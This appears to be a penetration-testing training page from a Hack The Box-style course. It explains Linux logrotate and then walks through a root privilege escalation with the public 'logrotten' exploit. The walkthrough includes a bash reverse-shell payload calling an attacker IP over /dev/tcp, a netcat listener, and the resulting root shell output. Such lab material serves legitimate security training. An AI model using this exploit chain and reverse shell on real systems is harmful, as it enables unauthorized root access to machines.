---
icon: linux
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: true
---

# Logrotate

Linux system produces large amounts of log files. To prevent the hard disk from overflowing, a tool called **logrotate** takes care of archiving or disposing of old logs.

`Logrotate` has many features for managing log files. These include the specification of:

* the `size` of the log file,
* its `age`,
* and the `action` to be taken when one of these factors is reached.

The function of the rotation itself consists in renaming the log files. For example, new log files can be created for each new day, and the older ones will be renamed automatically. Another example of this would be to empty the oldest log file and thus reduce memory consumption.

This tool is usually started periodically via `cron` and controlled via the configuration file `/etc/logrotate.conf`. Within this file, it contains global settings that determine the function of `logrotate`.

## logrotate Config Files

To force a new rotation on the same day, we can set the date after the individual log files in the status file `/var/lib/logrotate.status` or use the `-f`/`--force` option:

```shell-session
sudo cat /var/lib/logrotate.status

/var/log/samba/log.smbd" 2022-8-3
/var/log/mysql/mysql.log" 2022-8-3
```

We can find the corresponding configuration files in `/etc/logrotate.d/` directory.

```shell-session
McClewR@htb[/htb]$ ls /etc/logrotate.d/

alternatives  apport  apt  bootlog  btmp  dpkg  mon  rsyslog  ubuntu-advantage-tools  ufw  unattended-upgrades  wtmp
```

```shell-session
McClewR@htb[/htb]$ cat /etc/logrotate.d/dpkg

/var/log/dpkg.log {
        monthly
        rotate 12
        compress
        delaycompress
        missingok
        notifempty
        create 644 root root
}
```

## Privilege Escalation

To exploit `logrotate`, we need some requirements that we have to fulfil.

1. we need `write` permissions on the log files
2. logrotate must run as a privileged user or `root`
3. vulnerable versions:
   * 3.8.6
   * 3.11.0
   * 3.15.0
   * 3.18.0

There is a prefabricated exploit that we can use for this if the requirements are met. This exploit is named [logrotten](https://github.com/whotwagner/logrotten). We can download and compile it on a similar kernel of the target system and then transfer it to the target system. Alternatively, if we can compile the code on the target system, then we can do it directly on the target system.

```shell-session
logger@nix02:~$ git clone https://github.com/whotwagner/logrotten.git
logger@nix02:~$ cd logrotten
logger@nix02:~$ gcc logrotten.c -o logrotten
```

Next, we need a payload to be executed. Here many different options are available to us that we can use. In this example, we will run a simple bash-based reverse shell with the `IP` and `port` of our VM that we use to attack the target system.

{% code title="Command" %}
```bash
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```
{% endcode %}

However, before running the exploit, we need to determine which option `logrotate` uses in `logrotate.conf`.

{% code title="Command" %}
```bash
grep "create\|compress" /etc/logrotate.conf | grep -v "#"
```
{% endcode %}

{% code title="Example Output" %}
```
create
```
{% endcode %}

In this example, it is the option: `create`. Therefore we have to use the exploit adapted to this function.

After that, we have to start a listener on our machine, which waits for the target system's connection.

```bash
nc -nlvp 9001
```

As a final step, we run the exploit with the prepared payload and wait for a reverse shell as a privileged user or root.

{% code title="Command" %}
```bash
./logrotten -p ./payload /tmp/tmp.log
```
{% endcode %}

{% code title="NetCat Listener Output" %}
```bash
...
Listening on 0.0.0.0 9001

Connection received on 10.129.24.11 49818
# id

uid=0(root) gid=0(root) groups=0(root)
```
{% endcode %}
